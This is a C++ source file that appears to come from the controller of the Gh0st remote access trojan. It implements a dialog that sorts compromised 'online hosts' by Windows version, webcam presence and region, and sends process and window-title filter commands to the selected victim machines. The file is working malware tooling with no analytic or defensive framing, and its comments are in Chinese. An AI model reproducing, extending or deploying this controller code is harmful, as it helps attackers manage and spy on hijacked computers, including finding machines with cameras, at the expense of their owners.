// MoreChoose.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "MoreChoose.h"

#include "PcView.h"
#include "gh0stView.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CPcView* g_pConnectView;
extern CGh0stView* g_pTabView;
/////////////////////////////////////////////////////////////////////////////
// CMoreChoose

IMPLEMENT_DYNCREATE(CMoreChoose, CFormView)

CMoreChoose::CMoreChoose()
	: CFormView(CMoreChoose::IDD)
{
	//{{AFX_DATA_INIT(CMoreChoose)
	m_Win2000 = FALSE;
	m_Win2003 = FALSE;
	m_Win2008 = FALSE;
	m_WinNT = FALSE;
	m_WinVista = FALSE;
	m_Win7 = FALSE;
	m_WinXP = FALSE;
	m_check_num = FALSE;
	m_check_all = FALSE;
	m_edit_num = 0;
	//}}AFX_DATA_INIT
}

CMoreChoose::~CMoreChoose()
{
}

void CMoreChoose::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMoreChoose)
	DDX_Check(pDX, IDC_CHECK_2000, m_Win2000);
	DDX_Check(pDX, IDC_CHECK_2003, m_Win2003);
	DDX_Check(pDX, IDC_CHECK_2008, m_Win2008);
	DDX_Check(pDX, IDC_CHECK_NT, m_WinNT);
	DDX_Check(pDX, IDC_CHECK_VISTA, m_WinVista);
	DDX_Check(pDX, IDC_CHECK_WIN7, m_Win7);
	DDX_Check(pDX, IDC_CHECK_XP, m_WinXP);
	DDX_Check(pDX, IDC_CHECK_NUM, m_check_num);
	DDX_Check(pDX, IDC_CHECK_ALL, m_check_all);
	DDX_Text(pDX, IDC_EDIT_NUM, m_edit_num);
	DDV_MinMaxInt(pDX, m_edit_num, 0, 1000000);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CMoreChoose, CFormView)
	//{{AFX_MSG_MAP(CMoreChoose)
	ON_BN_CLICKED(IDC_CHECK_NUM, OnCheckNum)
	ON_BN_CLICKED(IDC_FIND, OnFind)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMoreChoose diagnostics

#ifdef _DEBUG
void CMoreChoose::AssertValid() const
{
	CFormView::AssertValid();
}

void CMoreChoose::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMoreChoose message handlers

void CMoreChoose::OnCheckNum() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);
	int a = 0;
	CPcView* pView = NULL;
	if ( m_check_all == TRUE )
	{
		int count = g_pTabView->m_wndTabControl.GetItemCount();
		for ( int i = 0; i < count; i++ )
		{
			pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
			a += pView->m_pListCtrl->GetItemCount();
		}
		if ( a == 0 )
		{	
			CheckDlgButton(IDC_CHECK_NUM, BST_UNCHECKED);
			AfxMessageBox( "没有主机上线- -。。" );
			return;
		}
	}
	else
	{
		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
		if (pView->m_pListCtrl->GetItemCount() == 0)
		{
			AfxMessageBox( "当前分组没有主机上线- -。。" );
			CheckDlgButton(IDC_CHECK_NUM, BST_UNCHECKED);
			return;
		}
	}
	GetDlgItem(IDC_EDIT_NUM)->EnableWindow(m_check_num);
}

void CMoreChoose::OnFind() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);
	CString strNewGroup, strOS, strCam, strAddress, process, window;
	CPcView* pView = NULL;
	if ( m_check_all == TRUE )
	{	
		/*
		((CComboBox*)GetDlgItem(IDC_INSTALL_PATH))->GetWindowText(strNewGroup);
		if ( strNewGroup.GetLength() == NULL )
		{
			::MessageBox(0,"请填写筛选后移动的分组名称！","提示", MB_ICONINFORMATION);
			return;
		}
		*/
		CPcView* pView = NULL;
		int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
		int newnum = 0 ;
		for (int k = 0 ; k < nTabs; k++ )
		{
			pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(k)->GetHandle()));			
			int num = pView->m_pListCtrl->GetItemCount();
			newnum = newnum + num ;//获取总共主机
		}
		if (newnum == 0)
		{
			::AfxMessageBox("没有主机上线- -。。");
			return;
		}

		for (int n = 0; n < nTabs; n++ )
		{
			pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
			int nCnt = pView->m_pListCtrl->GetItemCount();
			for ( int i = 0; i < nCnt; i++)
			{	
				pView->m_pListCtrl->SetCheck( i, FALSE );
	//---------------------------系统筛选---------------------------------------------------------
				strOS = pView->m_pListCtrl->GetItemText( i, 3 );
				strOS.MakeUpper();
				if ( m_WinNT == TRUE )
				{
					if ( strOS.Find("NT") != -1 )
					{
						pView->m_pListCtrl->SetCheck( i, TRUE );
					}
				}
				if ( m_WinXP == TRUE )
				{	
					if ( strOS.Find("XP") != -1 )
					{
						pView->m_pListCtrl->SetCheck( i, TRUE );
					}
				}
				if ( m_WinVista == TRUE )
				{
					if ( strOS.Find("Vista") != -1 )
					{
						pView->m_pListCtrl->SetCheck( i, TRUE );
					}
				}
				if ( m_Win2000 == TRUE )
				{
					if ( strOS.Find("2000") != -1 )
					{
						pView->m_pListCtrl->SetCheck( i, TRUE ); 
					}
				}
				if ( m_Win2003 == TRUE )
				{
					if ( strOS.Find("2003") != -1 )
					{
						pView->m_pListCtrl->SetCheck( i, TRUE ); 
					}
				}
				if ( m_Win2008 == TRUE )
				{
					if ( strOS.Find("2008") != -1 )
					{
						pView->m_pListCtrl->SetCheck( i, TRUE ); 
					}
				}
				if ( m_Win7 == TRUE )
				{
					if ( strOS.Find("Win7") != -1 )
					{
						pView->m_pListCtrl->SetCheck( i, TRUE ); 
					}
				}
				//判断系统按钮是否选中，选中则筛选前面已筛选出的主机，否侧全部筛选						
				if (m_WinNT == FALSE & m_WinXP == FALSE & m_WinVista == FALSE & m_Win7 == FALSE
					& m_Win2008 == FALSE & m_Win2003 == FALSE & m_Win2000 == FALSE)
				{
					pView->m_pListCtrl->SetCheck( i, TRUE );
				}
	//---------------------------视频筛选---------------------------------------------------------
				((CComboBox*)GetDlgItem(IDC_COMBO_CAM))->GetWindowText(strCam);
				if ( strCam.Find("不限") == -1 )
				{
					if ( strCam.Find( "有" ) != -1 )
					{	
						strCam = pView->m_pListCtrl->GetItemText( i, 9 );
						if ( strCam.Find( "有" ) != -1 )
						{
							pView->m_pListCtrl->SetCheck( i, TRUE );
						}
						else
						{
							pView->m_pListCtrl->SetCheck( i, FALSE );
						}
					}
					else
					{	
						strCam = pView->m_pListCtrl->GetItemText( i, 9 );
						if ( strCam.Find( "无" ) != -1 )
						{
							pView->m_pListCtrl->SetCheck( i, TRUE );
						}
						else
						{
							pView->m_pListCtrl->SetCheck( i, FALSE );
						}
					}
				} 
//---------------------------区域筛选---------------------------------------------------------			
				if (pView->m_pListCtrl->GetCheck( i )== TRUE)
				{
					((CComboBox*)GetDlgItem(IDC_COMBO_ADDRESS))->GetWindowText(strAddress);
					if ( strAddress.GetLength() != NULL )
					{	
						if (strstr( pView->m_pListCtrl->GetItemText( i, 11 ), strAddress ) != NULL )
						{
							pView->m_pListCtrl->SetCheck( i, TRUE );
						}
						else
						{
							pView->m_pListCtrl->SetCheck( i, FALSE );
						}
					}
				}
	//---------------------------视频筛选---------------------------------------------------------
				((CComboBox*)GetDlgItem(IDC_COMBO_CAM))->GetWindowText(strCam);
				if (pView->m_pListCtrl->GetCheck( i )== TRUE)
				{
					if ( strCam.Find("不限") == -1 )
					{
						if ( strCam.Find( "有" ) != -1 )
						{	
							strCam = pView->m_pListCtrl->GetItemText( i, 9 );
							if ( strCam.Find( "有" ) != -1 )
							{
								pView->m_pListCtrl->SetCheck( i, TRUE );
							}
							else
							{
								pView->m_pListCtrl->SetCheck( i, FALSE );
							}
						}
						else
						{	
							strCam = pView->m_pListCtrl->GetItemText( i, 9 );
							if ( strCam.Find( "无" ) != -1 )
							{
								pView->m_pListCtrl->SetCheck( i, TRUE );
							}
							else
							{
								pView->m_pListCtrl->SetCheck( i, FALSE );
							}
						}
					}
				}
//---------------------------区域筛选---------------------------------------------------------			
				if (pView->m_pListCtrl->GetCheck( i )== TRUE)
				{
					((CComboBox*)GetDlgItem(IDC_COMBO_ADDRESS))->GetWindowText(strAddress);
					if ( strAddress.GetLength() != NULL )
					{	
						if (strstr( pView->m_pListCtrl->GetItemText( i, 11 ), strAddress ) != NULL )
						{
							pView->m_pListCtrl->SetCheck( i, TRUE );
						}
						else
						{
							pView->m_pListCtrl->SetCheck( i, FALSE );
						}
					}
				}
			}//for								
		}//tab
	//--------------------------进程筛选发送-------------------------------------------------
		((CComboBox*)GetDlgItem(IDC_COMBO_PROSS))->GetWindowText(process);
		if (process.GetLength() != NULL)
		{
			if (m_WinNT == FALSE & m_WinXP == FALSE & m_WinVista == FALSE & m_Win7 == FALSE& m_Win2008 == FALSE 
				& m_Win2003 == FALSE & m_Win2000 == FALSE & strAddress.GetLength() == NULL & strCam.Find("不限") != -1)
			{
				CPcView* pView = NULL;
				pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
				int nCnt = pView->m_pListCtrl->GetItemCount();
				for ( int i = 0; i < nCnt; i++)
				{
					pView->m_pListCtrl->SetCheck( i, TRUE );
				}
			}
			int		nPacketLength = process.GetLength() + 2;
			LPBYTE	lpPacket = new BYTE[nPacketLength];
			lpPacket[0] = COMMAND_SORT_PROCESS;
			memcpy(lpPacket + 1, process.GetBuffer(0), nPacketLength - 1);
			g_pConnectView->SendSelectCommand(lpPacket, nPacketLength);
			delete[] lpPacket;
		}
	//---------------------------窗体筛选发送-------------------------------------------------
		((CComboBox*)GetDlgItem(IDC_COMBO_WINDOW))->GetWindowText(window);
		if ( window.GetLength() != NULL)
		{
			if (m_WinNT == FALSE & m_WinXP == FALSE & m_WinVista == FALSE & m_Win7 == FALSE& m_Win2008 == FALSE 
				& m_Win2003 == FALSE & m_Win2000 == FALSE & strAddress.GetLength() == NULL & strCam.Find("不限") != -1
				& process.GetLength() == NULL)
			{
				CPcView* pView = NULL;
				pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
				int nCnt = pView->m_pListCtrl->GetItemCount();
				for ( int i = 0; i < nCnt; i++)
				{
					pView->m_pListCtrl->SetCheck( i, TRUE );
				}
			}
			int		nPacketLength = window.GetLength() + 2;
			LPBYTE	lpPacket = new BYTE[nPacketLength];
			lpPacket[0] = COMMAND_SORT_WINDOW;
			memcpy(lpPacket + 1, window.GetBuffer(0), nPacketLength - 1);
			g_pConnectView->SendSelectCommand(lpPacket, nPacketLength);
			delete[] lpPacket;			
		} 	
	}
	else
	{	
		CPcView* pView = NULL;		
		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
		int nItems = pView->m_pListCtrl->GetItemCount();
		if ( nItems == 0)
		{
			AfxMessageBox( "当前分组没有主机上线- -。。" );
			return;
		}
		for ( int i = 0; i < nItems; i++)
		{	
			pView->m_pListCtrl->SetCheck( i, FALSE );
//---------------------------系统筛选---------------------------------------------------------
			strOS = pView->m_pListCtrl->GetItemText( i, 3 );
			strOS.MakeUpper();
			if ( m_WinNT == TRUE )
			{
				if ( strOS.Find("NT") != -1 )
				{
					pView->m_pListCtrl->SetCheck( i, TRUE );
				}
			}
			if ( m_WinXP == TRUE )
			{	
				if ( strOS.Find("XP") != -1 )
				{
					pView->m_pListCtrl->SetCheck( i, TRUE );
				}
			}
			if ( m_WinVista == TRUE )
			{
				if ( strOS.Find("Vista") != -1 )
				{
					pView->m_pListCtrl->SetCheck( i, TRUE );
				}
			}
			if ( m_Win2000 == TRUE )
			{
				if ( strOS.Find("2000") != -1 )
				{
					pView->m_pListCtrl->SetCheck( i, TRUE ); 
				}
			}
			if ( m_Win2003 == TRUE )
			{
				if ( strOS.Find("2003") != -1 )
				{
					pView->m_pListCtrl->SetCheck( i, TRUE ); 
				}
			}
			if ( m_Win2008 == TRUE )
			{
				if ( strOS.Find("2008") != -1 )
				{
					pView->m_pListCtrl->SetCheck( i, TRUE ); 
				}
			}
			if ( m_Win7 == TRUE )
			{
				if ( strOS.Find("Win7") != -1 )
				{
					pView->m_pListCtrl->SetCheck( i, TRUE ); 
				}
			}
			//判断系统按钮是否选中，没选中则全部勾选一下						
			if (m_WinNT == FALSE & m_WinXP == FALSE & m_WinVista == FALSE & m_Win7 == FALSE
				& m_Win2008 == FALSE & m_Win2003 == FALSE & m_Win2000 == FALSE)
			{
				pView->m_pListCtrl->SetCheck( i, TRUE );
			}
//---------------------------视频筛选---------------------------------------------------------
			((CComboBox*)GetDlgItem(IDC_COMBO_CAM))->GetWindowText(strCam);
			if ( strCam.Find("不限") == -1 )
			{
				if ( strCam.Find( "有" ) != -1 )
				{	
					strCam = pView->m_pListCtrl->GetItemText( i, 9 );
					if ( strCam.Find( "有" ) != -1 )
					{
						pView->m_pListCtrl->SetCheck( i, TRUE );
					}
					else
					{
						pView->m_pListCtrl->SetCheck( i, FALSE );
					}
				}
				else
				{	
					strCam = pView->m_pListCtrl->GetItemText( i, 9 );
					if ( strCam.Find( "无" ) != -1 )
					{
						pView->m_pListCtrl->SetCheck( i, TRUE );
					}
					else
					{
						pView->m_pListCtrl->SetCheck( i, FALSE );
					}
				}
			} 
//---------------------------区域筛选---------------------------------------------------------			
			if (pView->m_pListCtrl->GetCheck( i )== TRUE)
			{
				((CComboBox*)GetDlgItem(IDC_COMBO_ADDRESS))->GetWindowText(strAddress);
				if ( strAddress.GetLength() != NULL )
				{	
					if (strstr( pView->m_pListCtrl->GetItemText( i, 11 ), strAddress ) != NULL )
					{
						pView->m_pListCtrl->SetCheck( i, TRUE );
					}
					else
					{
						pView->m_pListCtrl->SetCheck( i, FALSE );
					}
				}
			}
		}
	//---------------------------进程筛选发送-------------------------------------------------
		((CComboBox*)GetDlgItem(IDC_COMBO_PROSS))->GetWindowText(process);
		if (process.GetLength() != NULL)
		{
			if (m_WinNT == FALSE & m_WinXP == FALSE & m_WinVista == FALSE & m_Win7 == FALSE& m_Win2008 == FALSE 
				& m_Win2003 == FALSE & m_Win2000 == FALSE & strAddress.GetLength() == NULL & strCam.Find("不限") != -1)
			{
				CPcView* pView = NULL;
				pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
				int nCnt = pView->m_pListCtrl->GetItemCount();
				for ( int i = 0; i < nCnt; i++)
				{
					pView->m_pListCtrl->SetCheck( i, TRUE );
				}
			}
			int		nPacketLength = process.GetLength() + 2;
			LPBYTE	lpPacket = new BYTE[nPacketLength];
			lpPacket[0] = COMMAND_SORT_PROCESS;
			memcpy(lpPacket + 1, process.GetBuffer(0), nPacketLength - 1);
			g_pConnectView->SendSelectCommand(lpPacket, nPacketLength);
			delete[] lpPacket;			
		}
	//---------------------------窗体筛选发送-------------------------------------------------
		((CComboBox*)GetDlgItem(IDC_COMBO_WINDOW))->GetWindowText(window);
		if ( window.GetLength() != NULL)
		{
			if (m_WinNT == FALSE & m_WinXP == FALSE & m_WinVista == FALSE & m_Win7 == FALSE& m_Win2008 == FALSE 
				& m_Win2003 == FALSE & m_Win2000 == FALSE & strAddress.GetLength() == NULL & strCam.Find("不限") != -1
				& process.GetLength() == NULL)
			{
				CPcView* pView = NULL;
				pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
				int nCnt = pView->m_pListCtrl->GetItemCount();
				for ( int i = 0; i < nCnt; i++)
				{
					pView->m_pListCtrl->SetCheck( i, TRUE );
				}
			}
			int		nPacketLength = window.GetLength() + 2;
			LPBYTE	lpPacket = new BYTE[nPacketLength];
			lpPacket[0] = COMMAND_SORT_WINDOW;
			memcpy(lpPacket + 1, window.GetBuffer(0), nPacketLength - 1);
			g_pConnectView->SendSelectCommand(lpPacket, nPacketLength);
			delete[] lpPacket;			
		} 		
	}
}

